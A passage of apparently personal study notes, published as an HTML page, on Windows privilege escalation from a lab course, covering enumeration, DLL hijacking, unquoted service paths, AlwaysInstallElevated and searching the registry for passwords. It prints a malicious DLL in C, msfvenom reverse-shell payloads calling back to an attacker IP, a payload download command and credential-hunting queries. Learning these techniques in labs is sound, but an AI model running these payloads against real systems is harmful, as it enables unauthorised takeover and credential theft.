+PS C:\Users\user\Desktop&gt; Import-Module .\PowerUp.ps1
+
+PS C:\Users\user\Desktop&gt; Invoke-AllChecks
+
+</code></pre>
+<ul>
+<li>Windows Exploit Suggester</li>
+</ul>
+<p><a href="https://github.com/bitsadmin/wesng">link</a></p>
+<p>update database before each use : <code>windows-exploit-suggester.py –update</code></p>
+<p><code>windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt</code></p>
+<p><em>note : need to run --systeminfo to work properly</em></p>
+<h2 id="vulnerable-software">vulnerable software</h2>
+<p><code>wmic</code> tool seen previously to list software installed on the target system and its versions. <code>wmic product</code> will dump the information it gathered on softwares.</p>
+<p>You could filter the output to obtain a cleaner output with the command below.</p>
+<p><code>wmic product get name,version,vendor</code></p>
+<p>sometimes 32 but software running on system does not show with above cmd , use 
+<code>wmic service list brief</code> to list it out.</p>
+<p>grep the output for running services
+<code>wmic service list brief | findstr  "Running"</code></p>
+<p>if you need more info about service user
+<code>sc qc service_name</code></p>
+<h2 id="dll-hijacking">DLL Hijacking</h2>
+<ul>
+<li>DLL hijacking is an effective technique that can allow you to inject code into an application.</li>
+<li>Some Windows executables will use Dynamic Link Libraries (DLLs) when running. </li>
+<li>if we can switch the legitimate DLL file with a specially crafted DLL file, our code will be run by the application.</li>
+<li>DLL hijacking requires an application (typically an exe file) that either has a missing DLL file, or where the search order can be used to insert the malicious DLL file.</li>
+</ul>
+<p>We need a </p>
+<ol>
+<li>An application that uses one or more DLL files.</li>
+<li>A way to manipulate these DLL files. (Manipulating DLL files could mean replacing an existing file or creating a file in the location where the application is looking for it. )</li>
+</ol>
+<p>we need to know where application look for dll file.</p>
+<p>for standard desktop applications, Windows will follow one of the orders listed below depending on if the SafeDllSearchMode is enabled or not. </p>
+<p><strong>SafeDllSearchMode is enabled</strong></p>
+<ol>
+<li>
+<p>The directory from which the application loaded.</p>
+</li>
+<li>
+<p>The system directory. Use the GetSystemDirectory function to get the path of this directory.</p>
+</li>
+<li>
+<p>The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</p>
+</li>
+<li>
+<p>The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</p>
+</li>
+<li>
+<p>The current directory.</p>
+</li>
+<li>
+<p>The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.</p>
+</li>
+</ol>
+<p><strong>SafeDllSearchMode is disabled</strong></p>
+<ol>
+<li>
+<p>The directory from which the application loaded.</p>
+</li>
+<li>
+<p>The current directory.</p>
+</li>
+<li>
+<p>The system directory. Use the GetSystemDirectory function to get the path of this directory.</p>
+</li>
+<li>
+<p>The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</p>
+</li>
+<li>
+<p>The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</p>
+</li>
+<li>
+<p>The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.</p>
+</li>
+</ol>
+<h3 id="finding-dll-hijacking-vulnerabilities">Finding DLL Hijacking Vulnerabilities</h3>
+<ul>
+<li>
+<p>Identifying DLL Hijacking vulnerabilities will require loading additional tools or scripts to the target system.</p>
+</li>
+<li>
+<p>we use process monitor(<code>procmon</code>) tool.</p>
+</li>
+</ul>
+<p><img alt="img" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png" /></p>
+<h3 id="creating-the-malicious-dll-file">Creating the malicious DLL file</h3>
+<ul>
+<li>code for malicious dll file</li>
+</ul>
+<pre><code class="language-c">
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system(&quot;cmd.exe /k whoami &gt; C:\\Temp\\dll.txt&quot;);
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+</code></pre>
+<ul>
+<li>The mingw compiler can be used to generate the DLL file with the command given below: </li>
+</ul>
+<p><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</code></p>
+<p>installation of mingw compiler on linux: <code>apt install gcc-mingw-w64-x86-64</code></p>
+<p>transfer the file to target system.(you can user powershell)
+<code>wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll</code></p>
+<p>stop and start the dllsvc service again 
+<code>sc stop dllsvc &amp; sc start dllsvc</code></p>
+<hr />
+<h2 id="unquoted-service-path">Unquoted Service Path</h2>
+<p>when the service is launched, Windows follows a search order, example we have a service (e.g. srvc) which has a binary path set to <code>C:\Program Files\topservice folder\subservice subfolder\srvc.exe</code>.</p>
+<ul>
+<li>
+<p>If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. </p>
+</li>
+<li>
+<p>if the path is not written between quotes and if any folder name in the path has a space in its name,Windows will append ".exe" and start looking for an executable,</p>
+</li>
+</ul>
+<p>we need to </p>
+<ol>
+<li>Being able to write to a folder on the path</li>
+<li>Being able to restart the service</li>
+</ol>
+<p>we can use winpeas or powerups script to find out unquoted path or we can use wmic.</p>
+<p><code>wmic service get name,displayname,pathname,startmode</code></p>
+<p>find path that is not written between quotes and make sure other conditions to exploit this vulnerability are met.</p>
+<p>you check binary path of servcie : <code>sc qc unquotedsvc</code></p>
+<p>generate an executable. </p>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe &gt; executable_name.exe</code></p>
+<p>set multi handler in msf.</p>
+<p>start the service.
+<code>sc start unquotedsvc</code></p>
+<h2 id="quick-wins">Quick wins</h2>
+<p><strong>Scheduled Tasks</strong></p>
+<p>Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or using a binary you can modify. </p>
+<p><code>schtasks</code> used to list scheduled task.</p>
+<p><strong>AlwaysInstallElevated</strong></p>
+<p>Windows installer files(.msi files) used to install applications on the system. sometimes this can be configured to run with higher privileges if the installation requires administrator privileges. This could potentially allow us to generate a malicious MSI file that would run with admin privileges. </p>
+<p>it required two registry values to be set using cmd line.</p>
+<pre><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+</code></pre>
+<p>Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. </p>
+<p>generate malicious msi file.</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_10.10.97.109 LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+</code></pre>
+<p>dont forget to listen for connection.</p>
+<p>transfer the file to windows machine.</p>
+<p>run the installer</p>
+<pre><code>
+C:\Users\user\Desktop&gt;msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+</code></pre>
+<p><strong>password</strong></p>
+<ul>
+<li>list saved credentials : <code>cmdkey /list</code></li>
+<li>Registry keys potentially containing passwords : </li>
+</ul>
+<pre><code>reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
